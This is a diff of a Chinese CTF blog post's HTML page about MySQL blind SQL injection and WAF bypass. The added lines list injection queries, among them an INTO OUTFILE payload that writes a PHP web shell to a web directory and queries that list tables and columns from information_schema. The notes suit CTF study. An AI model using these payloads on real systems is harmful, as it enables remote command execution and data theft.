@@ -97,7 +97,7 @@
 <meta property="og:url" content="https://someonesometimes.github.io/2017/07/23/mysql盲注的统计学习/index.html">
 <meta property="og:site_name" content="Yiruma">
 <meta property="og:description" content="对ctf题目中盲注思路以及waf绕过的总结">
-<meta property="og:updated_time" content="2017-07-23T05:54:36.856Z">
+<meta property="og:updated_time" content="2017-08-26T11:08:25.450Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="mysql盲注的统计学习">
 <meta name="twitter:description" content="对ctf题目中盲注思路以及waf绕过的总结">
@@ -364,7 +364,13 @@
 <li>使用concat(‘adm’+’in’)就可以，但注意mysql中写成’adm’+’in’的结果是0。。。小心不要错了</li>
 </ul>
 <h2 id="sql盲注的注意事项"><a href="#sql盲注的注意事项" class="headerlink" title="sql盲注的注意事项"></a>sql盲注的注意事项</h2><p>最要紧的就是 = ‘i’或是0x表示，经常在payload里面写成 = {}，应该是 = ‘{}’<br>mysql的单字符比较中不区分大小写，应该使用binary()或者ascii()来区分大小写</p>
-<h2 id="sql盲注其他用到的点"><a href="#sql盲注其他用到的点" class="headerlink" title="sql盲注其他用到的点"></a>sql盲注其他用到的点</h2><p>group_concat()将一列数据整合</p>
+<h2 id="sql盲注其他用到的点"><a href="#sql盲注其他用到的点" class="headerlink" title="sql盲注其他用到的点"></a>sql盲注其他用到的点</h2><ul>
+<li>group_concat()将一列数据整合</li>
+<li>用来写文件<br><code>union select &quot;&lt;?php system($_GET[‘c’]);?&gt;&quot; into outfile &#39;/var/www/html/uploads/xie.php&#39;</code></li>
+<li>获取数据库 <code>select database()</code></li>
+<li>获取数据库中的表<br><code>select group_concat(table_name) from information_schema.tables where table_schema = &#39;news&#39;</code></li>
+<li>获取表中的对应列<br><code>select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;</code> </li>
+</ul>
 
       
     </div>
@@ -481,7 +487,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">16</span>
+                <span class="site-state-item-count">15</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
